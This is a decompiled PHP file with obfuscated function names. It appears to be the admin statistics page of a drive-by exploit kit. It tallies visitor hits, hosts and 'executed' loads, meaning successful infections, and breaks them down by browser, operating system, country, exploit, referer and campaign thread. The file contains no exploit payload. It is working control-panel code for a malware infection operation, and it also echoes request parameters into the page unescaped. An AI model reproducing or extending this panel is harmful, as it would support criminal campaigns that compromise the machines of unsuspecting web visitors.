<?php 
if( !defined("ADMIN_LOADED") ) 
{
    exit();
}

define("PAGE", "index");
$startDate = (isset($_GET["startDate"]) ? strtotime($_GET["startDate"]) : null);
$endDate = (isset($_GET["endDate"]) ? (strtotime($_GET["endDate"]) + 3600 * 24) - 1 : null);
$threadID = (isset($_GET["threadID"]) ? intval($_GET["threadID"]) : null);
$ruleID = (isset($_GET["ruleID"]) ? intval($_GET["ruleID"]) : null);
if( $ruleID == 0 ) 
{
    $ruleID = null;
}

$browsers = Logs::getstatisticsbybrowser($startDate, $endDate, $threadID, $ruleID);
$threads = Logs::getstatisticsbythread($startDate, $endDate, $threadID, $ruleID);
$oses = Logs::getstatisticsbyos($startDate, $endDate, $threadID, $ruleID);
$countries = Logs::getstatisticsbycountry($startDate, $endDate, $threadID, $ruleID);
$exploits = Logs::getstatisticsbyexploit($startDate, $endDate, $threadID, $ruleID);
$showReferers = Config::get("ShowReferers", 1);
if( $showReferers ) 
{
    $referers = Logs::getstatisticsbyreferers($startDate, $endDate, $threadID, $ruleID);
}

$stats = Logs::getglobalstatistics($threadID, $ruleID);
$stats2 = Logs::getglobalstatisticstoday($threadID, $ruleID);
if( $stats["hited"] != 0 ) 
{
    $perc = round($stats["hosts"] / $stats["hited"] * 100);
}
else
{
    $perc = 0;
}

if( $stats["hosts"] != 0 ) 
{
    $perc2 = round($stats["executed"] / $stats["hosts"] * 100);
}
else
{
    $perc2 = 0;
}

if( $stats2["hited"] != 0 ) 
{
    $perc3 = round($stats2["hosts"] / $stats2["hited"] * 100);
}
else
{
    $perc3 = 0;
}

if( $stats2["hosts"] != 0 ) 
{
    $perc4 = round($stats2["executed"] / $stats2["hosts"] * 100);
}
else
{
    $perc4 = 0;
}

$widgetsData = Logs::getstatisticsbywidgets($startDate, $endDate, $threadID, $ruleID);
$imgPath = Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=file&type=img&file=";
if( $threadID != null ) 
{
    $thread = db::selectone("*", "Threads", "ID=" . $threadID);
    if( $ruleID != null ) 
    {
        $startDate = db::select("select DateTime from Logs where (ThreadID = " . $threadID . ") and (RuleID = " . $ruleID . ") order by DateTime asc limit 0,1");
    }
    else
    {
        $startDate = db::select("select DateTime from Logs where ThreadID = " . $threadID . " order by DateTime asc limit 0,1");
    }

}
else
{
    $startDate = db::select("select DateTime from Logs order by DateTime asc limit 0,1");
}

if( 0 < count($startDate) ) 
{
    $startDate = $startDate[0]["DateTime"];
}
else
{
    $startDate = time();
}

$res = Prefs::get("column-1") . "," . Prefs::get("column-2");
$order = explode(",", $res);
foreach( $order as &$c ) 
{
    $c = substr($c, 1, 0 - 1);
}
$blockOrder = $order;
echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\r\n\t\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n\t<title>";
echo Lang::get("MenuMainButton");
echo "</title>\r\n\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\r\n\r\n\t<link rel=\"stylesheet\" href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=file&type=css&file=main.css\" type=\"text/css\" media=\"screen\" />\r\n</head>\r\n<body>\r\n\t<div class=\"title\">\r\n\t\t<ul>\r\n\t\t\t<li class=\"logo\"><a href=\"";
echo Config::get("AdminScriptName");
echo "\"><img src=\"";
echo $imgPath;
echo "logo.gif\" width=\"15px\" height=\"15px\"/></a></li>\r\n\t\t\t<li><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=threads\">";
echo Lang::get("MenuThreadsButton");
echo "</a></li>\r\n\t\t\t<li><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=files\">";
echo Lang::get("MenuFilesButton");
echo "</a></li>\r\n\t\t\t<li><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=secur\">";
echo Lang::get("MenuSecurityButton");
echo "</a></li>\r\n\t\t</ul>\r\n\t\t<div class=\"controls\">\r\n\t\t\t<ul>\r\n\t\t\t\t<li class=\"edit\"><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=prefs\"><img src=\"";
echo $imgPath;
echo "edit.gif\" width=\"7px\" height=\"7px\"/></a></li>\r\n\t\t\t\t<li class=\"logout\"><a href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=logout\"><img src=\"";
echo $imgPath;
echo "logout.gif\" width=\"6px\" height=\"10px\"/></a></li>\r\n\t\t\t</ul>\r\n\t\t</div>\r\n\t\t<div style=\"clear:both;\"></div>\r\n\t</div>\r\n\t<div class=\"interval\">\r\n\t\t<form action=\"";
echo Config::get("AdminScriptName");
echo "\" method=\"get\">\r\n\t\t\t";
echo Lang::get("Date");
echo ": <input name=\"startDate\" maxlength=\"10\" class=\"text\" value=\"";
echo (isset($_GET["startDate"]) ? $_GET["startDate"] : "");
echo "\"/> &mdash; <input maxlength=\"10\" name=\"endDate\" class=\"text\" value=\"";
echo (isset($_GET["endDate"]) ? $_GET["endDate"] : "");
echo "\"/>\r\n\t\t\t<input type=\"submit\" class=\"btn\" value=\"OK\"/>\r\n\t\t</form>\r\n\t</div>\r\n\t";
foreach( $blockOrder as $num => $o ) 
{
    switch( $o ) 
    {
        case "block-0":
            echo "\t\t\t\t<div class=\"mainStat\">\r\n\t\t\t\t\t<div class=\"label\">";
            echo Lang::get("GlobalStatistic");
            echo "</div>\r\n\t\t\t\t\t<div class=\"label2\">";
            echo Lang::get("TotalInfo");
            echo "</div>\r\n\t\t\t\t\t<div class=\"totalStat\">";
            echo $perc2;
            echo "%</div>\r\n\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t<div class=\"stat\"><b>";
            echo $stats["hited"];
            echo "</b> ";
            echo Lang::get("Hited");
            echo "</div><div class=\"hited\"></div>\r\n\t\t\t\t\t<div class=\"stat\"><b>";
            echo $stats["hosts"];
            echo "</b> ";
            echo Lang::get("Hosts");
            echo "</div><div class=\"hosts\"></div>\r\n\t\t\t\t\t<div class=\"stat\"><b>";
            echo $stats["executed"];
            echo "</b> ";
            echo Lang::get("Loads");
            echo "</div><div class=\"loads\"></div>\r\n\t\t\t\t\t<div class=\"loadLabel\">";
            echo Lang::get("LoadsTotal");
            echo "</div>\r\n\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t<div class=\"graph_hits\">\r\n\t\t\t\t\t\t<div class=\"graph_hosts\" style=\"width:";
            echo $perc;
            echo "%\">\r\n\t\t\t\t\t\t\t<div class=\"graph_loads\" style=\"width:";
            echo $perc2;
            echo "%\"></div>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t</div>\r\n\t\t\t\t\t<div class=\"odd\">\r\n\t\t\t\t\t\t<div class=\"label2\">";
            echo Lang::get("TodayInfo");
            echo "</div>\r\n\t\t\t\t\t\t<div class=\"totalStat\">";
            echo $perc4;
            echo "%</div>\r\n\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t<div class=\"stat\"><b>";
            echo $stats2["hited"];
            echo "</b> ";
            echo Lang::get("Hited");
            echo "</div><div class=\"hited\"></div>\r\n\t\t\t\t\t\t<div class=\"stat\"><b>";
            echo $stats2["hosts"];
            echo "</b> ";
            echo Lang::get("Hosts");
            echo "</div><div class=\"hosts\"></div>\r\n\t\t\t\t\t\t<div class=\"stat\"><b>";
            echo $stats2["executed"];
            echo "</b> ";
            echo Lang::get("Loads");
            echo "</div><div class=\"loads\"></div>\r\n\t\t\t\t\t\t<div class=\"loadLabel\">";
            echo Lang::get("LoadsTotal");
            echo "</div>\r\n\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t<div class=\"graph_hits\">\r\n\t\t\t\t\t\t\t<div class=\"graph_hosts\" style=\"width:";
            echo $perc3;
            echo "%\">\r\n\t\t\t\t\t\t\t\t<div class=\"graph_loads\" style=\"width:";
            echo $perc4;
            echo "%\"></div>\r\n\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t</div>\r\n\t\t\t\t</div>\r\n\t\t";
            break;
        case "block-1":
            _obfuscated_0D2813122E1A2B242C023930263037042F35101E2C2111_(Lang::get("StatisticsBrowsersLabel"), $browsers, Config::get("MaxBrowsersLimit"), "browsers");
            break;
        case "block-2":
            _obfuscated_0D2813122E1A2B242C023930263037042F35101E2C2111_(Lang::get("StatisticsOSLabel"), $oses, Config::get("MaxOSLimit"), "oses");
            break;
        case "block-3":
            _obfuscated_0D2813122E1A2B242C023930263037042F35101E2C2111_(Lang::get("StatisticsCountriesLabel"), $countries, Config::get("MaxCountriesLimit"), "countries");
            break;
        case "block-4":
            _obfuscated_0D2813122E1A2B242C023930263037042F35101E2C2111_(Lang::get("StatisticsExploitsLabel"), $exploits, Config::get("MaxExploitsLimit"), "exploits");
            break;
        case "block-5":
            _obfuscated_0D2813122E1A2B242C023930263037042F35101E2C2111_(Lang::get("StatisticsReferersLabel"), $referers, Config::get("MaxReferersLimit"), "referers");
            break;
        case "block-7":
            _obfuscated_0D2813122E1A2B242C023930263037042F35101E2C2111_(Lang::get("StatisticsThreadsLabel"), $threads, Config::get("MaxThreadsLimit"), "threads");
            break;
    }
    if( strpos($o, "widget-") === 0 ) 
    {
        $id = str_replace("widget-", "", $o);
        $data = $widgetsData[$id];
        _obfuscated_0D2813122E1A2B242C023930263037042F35101E2C2111_(Logs::$WidgetTitles[$id], $data, 9999, "widget");
    }

}
echo "</body>\r\n</html>";
function _obfuscated_0D2813122E1A2B242C023930263037042F35101E2C2111_($title, $arr, $limit, $type)
{
    echo "\t\t<div class=\"table";
    if( $type == "widget" ) 
    {
        echo "2";
    }

    echo "\">\r\n\t\t\t<div class=\"tableTitle\">";
    echo $title;
    echo "</div>\r\n\t\t\t<table>\r\n\t\t\t\t<thead>\r\n\t\t\t\t\t<td class=\"table_name\">";
    echo Lang::get("Name");
    echo "</td>\r\n\t\t\t\t\t";
    if( $type != "exploits" ) 
    {
        echo "\t\t\t\t\t\t<td>";
        echo Lang::get("StatisticsHitsLabel");
        echo "</td>\r\n\t\t\t\t\t\t<td>";
        echo Lang::get("StatisticsHostsLabel");
        echo "</td>\r\n\t\t\t\t\t";
    }

    echo "\t\t\t\t\t<td>";
    echo Lang::get("StatisticsLoadsLabel");
    echo "</td>\r\n\t\t\t\t\t<td class=\"table_percent\">";
    echo Lang::get("StatisticsPercentLabel");
    echo "</td>\r\n\t\t\t\t</thead>\r\n\t\t\t\t<tbody>\r\n\t\t\t\t\t";
    foreach( $arr as $num => $entry ) 
    {
        if( $limit <= $num ) 
        {
            continue;
        }

        echo "\t\t\t\t\t\t<tr";
        if( $num % 2 == 0 ) 
        {
            echo " class=\"odd\"";
        }

        echo ">\r\n\t\t\t\t\t\t\t<td class=\"table_name\">";
        echo $entry["Title"];
        echo "</td>\r\n\t\t\t\t\t\t\t";
        if( $type != "exploits" ) 
        {
            echo "\t\t\t\t\t\t\t\t<td>";
            echo $entry["Hited"];
            echo "</td>\r\n\t\t\t\t\t\t\t\t<td>";
            echo $entry["Hosts"];
            echo "</td>\r\n\t\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t\t<td>";
        echo $entry["Executed"];
        echo "</td>\r\n\t\t\t\t\t\t\t<td class=\"table_percent\">";
        echo ($entry["Hosts"] != 0 ? round($entry["Executed"] / $entry["Hosts"] * 100) : 0);
        echo "</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t";
    }
    echo "\t\t\t\t</tbody>\r\n\t\t\t</table>\r\n\t\t</div>\r\n";
}


